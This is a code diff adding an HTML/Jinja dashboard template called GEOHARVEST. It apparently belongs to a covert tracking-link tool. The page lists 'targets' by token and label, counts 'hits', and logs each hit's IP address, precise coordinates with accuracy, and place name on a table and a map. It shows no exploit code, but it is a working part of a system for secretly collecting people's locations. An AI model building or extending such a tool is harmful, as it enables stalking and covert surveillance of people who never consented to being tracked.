@@ -1,0 +1,37 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>GEOHARVEST</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
+<style>
+ body{margin:0;font:14px/1.5 ui-monospace,Menlo,monospace;background:#0b0f14;color:#dde}
+ h2{padding:14px 18px;margin:0;border-bottom:1px solid #1f2b39;font-size:14px}
+ table{width:100%;border-collapse:collapse}
+ td,th{padding:6px 10px;border-bottom:1px solid #16202b;text-align:left;font-size:12px;vertical-align:top}
+ th{color:#7f8fa4;font-weight:500}
+ a{color:#58a6ff;text-decoration:none}
+ #map{height:340px;margin:14px 18px;border-radius:10px}
+ .g{color:#3fb950}.r{color:#f85149}
+</style></head><body>
+<h2>GEOHARVEST · {{ targets|length }} targets · {{ hits|length }} hits</h2>
+<div id="map"></div>
+<h2>Targets</h2>
+<table><tr><th>token</th><th>label</th><th>created</th><th>hits</th><th>link</th></tr>
+{% for t in targets %}<tr>
+<td>{{ t.token }}</td><td>{{ t.label }}</td><td>{{ t.created_at }}</td>
+<td class="{{ 'g' if t.n else 'r' }}">{{ t.n }}</td>
+<td><a href="/t/{{ t.token }}" target="_blank">open</a></td></tr>{% endfor %}</table>
+<h2>Hit log</h2>
+<table><tr><th>ts</th><th>token</th><th>stage</th><th>ip</th><th>coords</th><th>place</th></tr>
+{% for h in hits %}<tr>
+<td>{{ h.ts }}</td><td>{{ h.token }}</td><td>{{ h.stage }}</td><td>{{ h.ip }}</td>
+<td>{% if h.lat %}<a href="https://maps.google.com/?q={{ h.lat }},{{ h.lon }}" target="_blank">{{ '%.5f'|format(h.lat) }}, {{ '%.5f'|format(h.lon) }}</a> ±{{ h.acc|int }}{% endif %}</td>
+<td>{{ h.place or '' }}</td></tr>{% endfor %}</table>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+ const m = L.map('map').setView([20,0],2);
+ L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19}).addTo(m);
+ const pts = {{ hits|selectattr('lat')|map(attribute='lat')|list|tojson }};
+ const lns = {{ hits|selectattr('lat')|map(attribute='lon')|list|tojson }};
+ const tks = {{ hits|selectattr('lat')|map(attribute='token')|list|tojson }};
+ pts.forEach((la,i)=>L.marker([la,lns[i]]).addTo(m).bindPopup(tks[i]));
+ if(pts.length) m.fitBounds(pts.map((la,i)=>[la,lns[i]]),{padding:[40,40]});
+</script></body></html>
